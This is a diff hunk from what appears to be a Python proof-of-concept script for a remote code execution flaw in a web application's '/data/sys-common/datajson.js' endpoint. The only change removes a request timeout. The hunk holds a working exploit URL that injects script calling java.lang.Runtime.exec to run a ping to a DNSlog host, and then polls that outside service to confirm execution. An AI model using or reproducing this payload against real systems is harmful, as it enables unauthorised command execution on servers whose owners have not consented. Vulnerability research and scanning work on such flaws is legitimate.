@@ -48,7 +48,7 @@ class poc:
             dnslog_all = dnslogs(self.proxies).get_dnslog()
             dnslog = dnslog_all[0]
             url = scheme+ '://'+ netloc +'/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 ' + dnslog + '")&type=1'
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             for i in range(5):
                 dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
             if dnslog_result != "[]":
